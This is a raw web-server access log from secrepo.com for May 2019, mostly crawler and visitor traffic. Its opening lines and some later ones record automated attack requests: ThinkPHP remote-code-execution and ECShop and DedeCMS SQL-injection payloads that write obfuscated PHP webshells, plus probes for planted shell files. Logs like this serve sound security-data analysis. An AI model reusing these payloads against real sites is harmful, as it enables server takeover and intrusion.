122.247.29.159 - - [07/May/2019:11:38:04 -0700] "POST /uploads/dede/sys_verifies.php?action=down HTTP/1.1" 404 294 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=down" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.29.159 - - [07/May/2019:11:38:04 -0700] "POST /index.php/api/Uploadify/preview HTTP/1.1" 404 294 "http://www.secrepo.com/index.php/api/Uploadify/preview" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.29.159 - - [07/May/2019:11:38:04 -0700] "GET /user.php?act=login HTTP/1.1" 404 294 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:288:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.29.159 - - [07/May/2019:11:38:04 -0700] "POST /fdgq.php HTTP/1.1" 404 294 "http://www.secrepo.com/fdgq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.29.159 - - [07/May/2019:11:38:05 -0700] "GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=rgqsz.php&content=%3C?php%20print(md5(222));$a=str_replace(%22vbnm%22,%22%22,%22asvbnmsert%22);@$a($_POST%5Bysy%5D);?%3Eysydjsjxbei37 HTTP/1.1" 200 46423 "http://www.secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=rgqsz.php&content=<?php print(md5(222));$a=str_replace(\"vbnm\",\"\",\"asvbnmsert\");@$a($_POST[ysy]);?>ysydjsjxbei37" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.29.159 - - [07/May/2019:11:38:06 -0700] "GET /rgqsz.php HTTP/1.1" 404 294 "http://www.secrepo.com/rgqsz.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.29.159 - - [07/May/2019:11:38:06 -0700] "GET /user.php?act=login HTTP/1.1" 404 294 "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:297:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A336C7A655846784C6E426F634363734A7A772F63476877494756325957776F4A46395154314E5557336C7A655630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.29.159 - - [07/May/2019:11:38:06 -0700] "POST /ysyqq.php HTTP/1.1" 404 294 "http://www.secrepo.com/ysyqq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.29.159 - - [07/May/2019:11:38:06 -0700] "GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=nzzqh.php&vars%5B1%5D%5B%5D=%3C?php%20print(md5(222));$a=str_replace(%22vbnm%22,%22%22,%22asvbnmsert%22);@$a($_POST%5Bysy%5D);?%3Eysydjsjxbei37$ HTTP/1.1" 200 46423 "http://www.secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=nzzqh.php&vars[1][]=<?php print(md5(222));$a=str_replace(\"vbnm\",\"\",\"asvbnmsert\");@$a($_POST[ysy]);?>ysydjsjxbei37$" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.29.159 - - [07/May/2019:11:38:07 -0700] "GET /nzzqh.php HTTP/1.1" 404 294 "http://www.secrepo.com/nzzqh.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.29.159 - - [07/May/2019:11:38:07 -0700] "GET /plus/mytag_js.php?dopost=saveedit&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=116&arrs2%5B%5D=97&arrs2%5B%5D=103&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=40&arrs2%5B%5D=97&arrs2%5B%5D=105&arrs2%5B%5D=100&arrs2%5B%5D=44&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=41&arrs2%5B%5D=32&arrs2%5B%5D=86&arrs2%5B%5D=65&arrs2%5B%5D=76&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=40&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=104&arrs2%5B%5D=111&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=109&arrs2%5B%5D=115&arrs2%5B%5D=32&arrs2%5B%5D=53&arrs2%5B%5D=46&arrs2%5B%5D=55&arrs2%5B%5D=32&arrs2%5B%5D=48&arrs2%5B%5D=100&arrs2%5B%5D=97&arrs2%5B%5D=121&arrs2%5B%5D=60&arrs2%5B%5D=98&arrs2%5B%5D=114&arrs2%5B%5D=62&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=44&arrs2%5B%5D=32&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=115&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=46&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=103&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=59&arrs2%5B%5D=64&arrs2%5B%5D=112&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=103&arrs2%5B%5D=95&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=112&arrs2%5B%5D=108&arrs2%5B%5D=97&arrs2%5B%5D=99&arrs2%5B%5D=101&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=47&arrs2%5B%5D=91&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=112&arrs2%5B%5D=121&arrs2%5B%5D=114&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=104&arrs2%5B%5D=116&arrs2%5B%5D=93&arrs2%5B%5D=47&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=36&arrs2%5B%5D=95&arrs2%5B%5D=82&arrs2%5B%5D=69&arrs2%5B%5D=81&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=84&arrs2%5B%5D=91&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=93&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=101&arrs2%5B%5D=114&arrs2%5B%5D=114&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=63&arrs2%5B%5D=62&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=0 HTTP/1.1" 404 294 "http://www.secrepo.com/plus/mytag_js.php?dopost=saveedit&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=57&arrs2[]=48&arrs2[]=57&arrs2[]=48&arrs2[]=44&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=39&arrs2[]=39&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=99&arrs2[]=109&arrs2[]=115&arrs2[]=32&arrs2[]=53&arrs2[]=46&arrs2[]=55&arrs2[]=32&arrs2[]=48&arrs2[]=100&arrs2[]=97&arrs2[]=121&arrs2[]=60&arrs2[]=98&arrs2[]=114&arrs2[]=62&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=44&arrs2[]=32&arrs2[]=57&arrs2[]=48&arrs2[]=115&arrs2[]=101&arrs2[]=99&arrs2[]=46&arrs2[]=111&arrs2[]=114&arrs2[]=103&arrs2[]=39&arrs2[]=39&arrs2[]=59&arrs2[]=64&arrs2[]=112&arrs2[]=114&arrs2[]=101&arrs2[]=103&arrs2[]=95&arrs2[]=114&arrs2[]=101&arrs2[]=112&arrs2[]=108&arrs2[]=97&arrs2[]=99&arrs2[]=101&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=47&arrs2[]=91&arrs2[]=99&arrs2[]=111&arrs2[]=112&arrs2[]=121&arrs2[]=114&arrs2[]=105&arrs2[]=103&arrs2[]=104&arrs2[]=116&arrs2[]=93&arrs2[]=47&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=36&arrs2[]=95&arrs2[]=82&arrs2[]=69&arrs2[]=81&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=39&arrs2[]=39&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=93&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=101&arrs2[]=114&arrs2[]=114&arrs2[]=111&arrs2[]=114&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=0" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.29.159 - - [07/May/2019:11:38:07 -0700] "GET /plus/download.php?open=1&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=97&arrs2%5B%5D=100&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=83&arrs2%5B%5D=69&arrs2%5B%5D=84&arrs2%5B%5D=32&arrs2%5B%5D=96&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=61&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=102&arrs2%5B%5D=105&arrs2%5B%5D=108&arrs2%5B%5D=101&arrs2%5B%5D=95&arrs2%5B%5D=112&arrs2%5B%5D=117&arrs2%5B%5D=116&arrs2%5B%5D=95&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=101&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=115&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=109&arrs2%5B%5D=111&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=46&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=118&arrs2%5B%5D=97&arrs2%5B%5D=108&arrs2%5B%5D=40&ar HTTP/1.1" 418 731 "http://www.secrepo.com/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=109&arrs2[]=111&arrs2[]=111&arrs2[]=110&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&ar" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.29.159 - - [07/May/2019:11:38:08 -0700] "POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1" 404 295 "http://www.secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
122.247.29.159 - - [07/May/2019:11:38:09 -0700] "POST /e/DoInfo/ecms.php HTTP/1.1" 404 294 "http://www.secrepo.com/e/DoInfo/ecms.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
93.125.99.118 - - [07/May/2019:11:41:09 -0700] "GET /wp-login.php HTTP/1.1" 301 466 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" 
93.125.99.118 - - [07/May/2019:11:41:09 -0700] "GET /wp-login.php HTTP/1.1" 404 303 "http://secrepo.com/wp-login.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" 
46.166.188.246 - - [07/May/2019:11:44:21 -0700] "HEAD / HTTP/1.1" 301 209 "https://uptime.com/secrepo.com" "Mozilla/5.0 (compatible; Uptimebot/1.0; +http://www.uptime.com/uptimebot)" 
207.46.13.190 - - [07/May/2019:11:44:53 -0700] "GET /self.logs/access.log.2017-11-20.gz HTTP/1.1" 200 27378 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.122 - - [07/May/2019:11:44:57 -0700] "GET /self.logs/access.log.2018-02-09.gz HTTP/1.1" 200 20996 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
108.59.0.37 - - [07/May/2019:11:48:29 -0700] "GET / HTTP/1.1" 200 12511 "-" "Vienna/7074 (Macintosh; Intel macOS 10_13_6)" 
207.46.13.117 - - [07/May/2019:11:48:35 -0700] "GET /self.logs/access.log.2017-03-06.gz HTTP/1.1" 200 19676 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
51.83.36.53 - - [07/May/2019:11:48:54 -0700] "GET / HTTP/1.1" 200 46413 "-" "-" 
94.64.183.7 - - [07/May/2019:11:50:11 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
94.64.183.7 - - [07/May/2019:11:50:11 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
94.64.183.7 - - [07/May/2019:11:50:11 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
94.64.183.7 - - [07/May/2019:11:50:11 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
94.64.183.7 - - [07/May/2019:11:50:12 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
173.11.82.205 - - [07/May/2019:11:50:17 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
173.11.82.205 - - [07/May/2019:11:50:17 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
173.11.82.205 - - [07/May/2019:11:50:18 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
173.11.82.205 - - [07/May/2019:11:50:18 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
173.11.82.205 - - [07/May/2019:11:50:18 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
207.46.13.122 - - [07/May/2019:12:01:59 -0700] "GET /self.logs/2016/error.log.2016-08-28.gz HTTP/1.1" 200 629 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.122 - - [07/May/2019:12:04:28 -0700] "GET /self.logs/2015/access.log.2015-10-21.gz HTTP/1.1" 200 7909 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.190 - - [07/May/2019:12:06:23 -0700] "GET /self.logs/2015/error.log.2015-02-09.gz HTTP/1.1" 200 1296 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
104.229.9.185 - - [07/May/2019:12:08:36 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
104.229.9.185 - - [07/May/2019:12:08:37 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
104.229.9.185 - - [07/May/2019:12:08:37 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
104.229.9.185 - - [07/May/2019:12:08:38 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" 
113.171.224.176 - - [07/May/2019:12:11:54 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
116.255.153.245 - - [07/May/2019:12:11:57 -0700] "POST //Config_Shell.php HTTP/1.1" 404 295 "http://www.secrepo.com//Config_Shell.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.153.245 - - [07/May/2019:12:11:57 -0700] "POST //fdgq.php HTTP/1.1" 404 294 "http://www.secrepo.com//fdgq.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.153.245 - - [07/May/2019:12:11:58 -0700] "POST //d.php HTTP/1.1" 404 294 "http://www.secrepo.com//d.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.153.245 - - [07/May/2019:12:11:58 -0700] "POST //config/AspCms_Config.asp HTTP/1.1" 404 294 "http://www.secrepo.com//config/AspCms_Config.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.153.245 - - [07/May/2019:12:11:58 -0700] "POST //plus/laobiao.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/laobiao.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.153.245 - - [07/May/2019:12:11:58 -0700] "POST //data/cache/asd.php HTTP/1.1" 404 294 "http://www.secrepo.com//data/cache/asd.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.153.245 - - [07/May/2019:12:11:59 -0700] "POST //plus/lucas.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/lucas.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.153.245 - - [07/May/2019:12:11:59 -0700] "POST //plus/read.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/read.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.153.245 - - [07/May/2019:12:11:59 -0700] "POST //data/cache/flye.php HTTP/1.1" 404 294 "http://www.secrepo.com//data/cache/flye.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.153.245 - - [07/May/2019:12:11:59 -0700] "POST //plus/mybak.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mybak.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.153.245 - - [07/May/2019:12:11:59 -0700] "POST //lx.php HTTP/1.1" 404 294 "http://www.secrepo.com//lx.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
116.255.153.245 - - [07/May/2019:12:12:00 -0700] "POST //x.php HTTP/1.1" 404 294 "http://www.secrepo.com//x.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
40.77.167.98 - - [07/May/2019:12:14:50 -0700] "GET /self.logs/error.log.2018-05-17.gz HTTP/1.1" 200 5277 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
199.58.86.206 - - [07/May/2019:12:14:54 -0700] "GET /robots.txt HTTP/1.1" 301 518 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.206 - - [07/May/2019:12:14:54 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.206 - - [07/May/2019:12:14:56 -0700] "GET / HTTP/1.1" 301 442 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.206 - - [07/May/2019:12:14:58 -0700] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.206 - - [07/May/2019:12:15:01 -0700] "GET / HTTP/1.1" 200 12455 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
185.245.87.169 - - [07/May/2019:12:16:43 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
185.245.87.169 - - [07/May/2019:12:16:44 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
207.46.13.122 - - [07/May/2019:12:26:15 -0700] "GET /self.logs/2015/access.log.2015-09-29.gz HTTP/1.1" 200 5316 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
129.55.200.20 - - [07/May/2019:12:26:23 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:60.0) Gecko/20100101 Firefox/60.0" 
84.72.78.23 - - [07/May/2019:12:33:16 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/16.2b14898 Mobile/15G77 Safari/605.1.15" 
207.46.13.122 - - [07/May/2019:12:38:50 -0700] "GET /self.logs/error.log.2017-04-06.gz HTTP/1.1" 200 2578 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
206.180.185.248 - - [07/May/2019:12:44:33 -0700] "HEAD / HTTP/1.1" 200 319 "-" "python-requests/2.19.1" 
38.18.32.121 - - [07/May/2019:12:44:40 -0700] "HEAD / HTTP/1.1" 200 319 "-" "python-requests/2.19.1" 
172.241.83.222 - - [07/May/2019:12:45:25 -0700] "HEAD /self.logs/ HTTP/1.1" 200 239 "-" "python-requests/2.19.1" 
108.62.9.49 - - [07/May/2019:12:45:55 -0700] "HEAD / HTTP/1.1" 200 319 "-" "python-requests/2.19.1" 
207.46.13.190 - - [07/May/2019:12:47:38 -0700] "GET /self.logs/access.log.2018-07-05.gz HTTP/1.1" 200 22451 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
108.59.0.37 - - [07/May/2019:12:48:14 -0700] "GET / HTTP/1.1" 200 12511 "-" "Vienna/7074 (Macintosh; Intel macOS 10_13_6)" 
207.46.13.122 - - [07/May/2019:12:48:38 -0700] "GET /self.logs/2016/error.log.2016-03-28.gz HTTP/1.1" 200 936 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
165.225.81.49 - - [07/May/2019:12:49:57 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 34312680 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0" 
116.255.161.64 - - [07/May/2019:12:53:11 -0700] "POST //lequ.php HTTP/1.1" 404 295 "http://www.secrepo.com//lequ.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
